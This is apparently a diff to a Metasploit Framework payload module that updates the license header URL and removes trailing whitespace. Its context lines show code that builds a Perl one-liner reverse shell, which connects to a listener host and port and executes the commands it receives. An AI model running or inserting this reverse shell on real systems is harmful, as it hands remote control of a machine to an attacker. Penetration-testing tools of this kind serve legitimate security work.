@@ -5,8 +5,8 @@
 ##
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
-# Framework web site for more information on licensing and terms of use.
-# http://metasploit.com/framework/
+# web site for more information on licensing and terms of use.
+#   http://metasploit.com/
 ##
 
 require 'msf/core'
@@ -51,7 +51,7 @@ module Metasploit3
 	#
 	def command_string
 		lhost = datastore['LHOST']
-		ver   = Rex::Socket.is_ipv6?(lhost) ? "6" : ""		
+		ver   = Rex::Socket.is_ipv6?(lhost) ? "6" : ""
 		lhost = "[#{lhost}]" if Rex::Socket.is_ipv6?(lhost)
 		cmd   = "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET#{ver}(PeerAddr,\"#{lhost}:#{datastore['LPORT']}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"
 	end
